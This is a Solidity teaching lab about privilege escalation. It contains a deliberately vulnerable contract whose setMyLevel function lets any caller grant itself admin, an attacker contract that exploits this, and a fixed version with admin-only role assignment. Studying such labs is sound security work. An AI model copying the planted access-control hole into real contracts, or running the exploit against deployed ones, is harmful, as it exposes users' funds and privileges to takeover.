// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*
 *  EXCEPTION LEVEL – SMART CONTRACT LAB
 *
 *  This single file contains:
 *
 *  1) ExceptionLevelV1        – vulnerable exception-level manager
 *  2) ExceptionLevelAttacker  – attacker exploiting privilege escalation bug
 *  3) ExceptionLevelV2Defense – secure exception-level manager with RBAC
 *
 *  Concept:
 *    - "Exception Level" (EL) inspired by CPU privilege levels:
 *        * EL0 = User
 *        * EL1 = Service
 *        * EL2 = Manager
 *        * EL3 = Admin
 *
 *    - V1 BUG: users can arbitrarily set their own exception level to EL3.
 *    - Attacker calls that function to become admin and run privileged ops.
 *    - V2 FIX: only current EL3 admin can assign levels; users cannot self-escalate.
 */


/* ============================================================= */
/*           1. VULNERABLE EXCEPTION LEVEL MANAGER (V1)          */
/* ============================================================= */

contract ExceptionLevelV1 {
    // 0 = EL0_USER, 1 = EL1_SERVICE, 2 = EL2_MANAGER, 3 = EL3_ADMIN
    enum EL {
        EL0_USER,
        EL1_SERVICE,
        EL2_MANAGER,
        EL3_ADMIN
    }

    // address -> current exception level
    mapping(address => EL) public exceptionLevel;

    event LevelSet(address indexed account, EL newLevel);
    event PrivilegedAction(address indexed caller, string action);

    constructor() {
        // Deployer starts as EL3 (Admin)
        exceptionLevel[msg.sender] = EL.EL3_ADMIN;
        emit LevelSet(msg.sender, EL.EL3_ADMIN);
    }

    /*
     *  ⚠️ VULNERABILITY:
     *
     *  Any caller can call setMyLevel() and choose ANY exception level,
     *  including EL3_ADMIN. This is a classic privilege escalation.
     */
    function setMyLevel(EL newLevel) external {
        exceptionLevel[msg.sender] = newLevel;
        emit LevelSet(msg.sender, newLevel);
    }

    // Require caller to be at least a certain exception level
    modifier atLeast(EL required) {
        require(
            uint8(exceptionLevel[msg.sender]) >= uint8(required),
            "insufficient exception level"
        );
        _;
    }

    // Example privileged operations

    function performAdminAction() external atLeast(EL.EL3_ADMIN) {
        emit PrivilegedAction(msg.sender, "EL3_ADMIN operation");
        // ... sensitive logic here ...
    }

    function performManagerAction() external atLeast(EL.EL2_MANAGER) {
        emit PrivilegedAction(msg.sender, "EL2_MANAGER operation");
        // ... sensitive logic here ...
    }

    function performServiceAction() external atLeast(EL.EL1_SERVICE) {
        emit PrivilegedAction(msg.sender, "EL1_SERVICE operation");
        // ... less sensitive logic here ...
    }
}


/* ============================================================= */
/*                    2. ATTACKER CONTRACT                       */
/* ============================================================= */

contract ExceptionLevelAttacker {
    ExceptionLevelV1 public target;
    address public attacker;

    event Escalated(address indexed attacker, uint8 newLevel);
    event AdminAbused(address indexed attacker);

    constructor(address _target) {
        target = ExceptionLevelV1(_target);
        attacker = msg.sender;
    }

    /*
     * Attack path:
     *
     *  1. call escalateToAdmin()
     *      → uses vulnerable setMyLevel(EL3_ADMIN) in V1
     *  2. call abuseAdminAction()
     *      → now passes atLeast(EL3_ADMIN) in V1 and performs admin operations
     */

    function escalateToAdmin() external {
        require(msg.sender == attacker, "not attacker");

        // Set our own level to EL3_ADMIN using vulnerable function
        target.setMyLevel(ExceptionLevelV1.EL.EL3_ADMIN);

        emit Escalated(attacker, uint8(ExceptionLevelV1.EL.EL3_ADMIN));
    }

    function abuseAdminAction() external {
        require(msg.sender == attacker, "not attacker");

        // Now that we are "admin" in V1, we can run privileged ops
        target.performAdminAction();

        emit AdminAbused(attacker);
    }
}


/* ============================================================= */
/*         3. SECURE EXCEPTION LEVEL MANAGER (V2 DEFENSE)        */
/* ============================================================= */

contract ExceptionLevelV2Defense {
    enum EL {
        EL0_USER,
        EL1_SERVICE,
        EL2_MANAGER,
        EL3_ADMIN
    }

    struct LevelRecord {
        EL level;
        uint64 updatedAt;
    }

    mapping(address => LevelRecord) public exceptionLevel;
    address public rootAdmin; // bootstrap super-admin

    event LevelAssigned(address indexed account, EL newLevel, address indexed by);
    event PrivilegedAction(address indexed caller, string action);
    event RootAdminChanged(address indexed oldAdmin, address indexed newAdmin);

    modifier onlyRootAdmin() {
        require(msg.sender == rootAdmin, "not root admin");
        _;
    }

    modifier atLeast(EL required) {
        require(
            uint8(exceptionLevel[msg.sender].level) >= uint8(required),
            "insufficient exception level"
        );
        _;
    }

    constructor() {
        rootAdmin = msg.sender;
        exceptionLevel[msg.sender] = LevelRecord({
            level: EL.EL3_ADMIN,
            updatedAt: uint64(block.timestamp)
        });
        emit LevelAssigned(msg.sender, EL.EL3_ADMIN, msg.sender);
    }

    function changeRootAdmin(address newAdmin) external onlyRootAdmin {
        require(newAdmin != address(0), "zero address");
        address old = rootAdmin;
        rootAdmin = newAdmin;
        emit RootAdminChanged(old, newAdmin);
    }

    /**
     * SECURE LEVEL ASSIGNMENT
     *
     * - Only EL3_ADMIN (plus rootAdmin) can assign/modify levels.
     * - No one (including users themselves) can self-escalate.
     * - Admin may lower or raise levels for others.
     */

    modifier onlyAdmin() {
        require(
            msg.sender == rootAdmin ||
                uint8(exceptionLevel[msg.sender].level) >= uint8(EL.EL3_ADMIN),
            "not admin"
        );
        _;
    }

    function adminSetLevel(address account, EL newLevel)
        external
        onlyAdmin
    {
        require(account != address(0), "zero account");

        exceptionLevel[account] = LevelRecord({
            level: newLevel,
            updatedAt: uint64(block.timestamp)
        });

        emit LevelAssigned(account, newLevel, msg.sender);
    }

    /**
     * Users MAY voluntarily *lower* their own exception level
     * (e.g., dropping from EL3 to EL1 for safety), but they cannot raise it.
     */

    function selfLowerLevel(EL newLowerLevel) external {
        LevelRecord storage r = exceptionLevel[msg.sender];

        // If no record yet, treat as EL0_USER
        EL current = r.level;

        // Only allow lowering: new <= current
        require(
            uint8(newLowerLevel) <= uint8(current),
            "cannot self-escalate"
        );

        exceptionLevel[msg.sender] = LevelRecord({
            level: newLowerLevel,
            updatedAt: uint64(block.timestamp)
        });

        emit LevelAssigned(msg.sender, newLowerLevel, msg.sender);
    }

    // --------- Privileged Actions (secure) ----------

    function performAdminAction() external atLeast(EL.EL3_ADMIN) {
        emit PrivilegedAction(msg.sender, "EL3_ADMIN operation");
        // secure admin logic here...
    }

    function performManagerAction() external atLeast(EL.EL2_MANAGER) {
        emit PrivilegedAction(msg.sender, "EL2_MANAGER operation");
        // secure manager logic here...
    }

    function performServiceAction() external atLeast(EL.EL1_SERVICE) {
        emit PrivilegedAction(msg.sender, "EL1_SERVICE operation");
        // secure service logic here...
    }

    function getLevel(address account) external view returns (EL level, uint64 updatedAt) {
        LevelRecord storage r = exceptionLevel[account];
        return (r.level, r.updatedAt);
    }
}
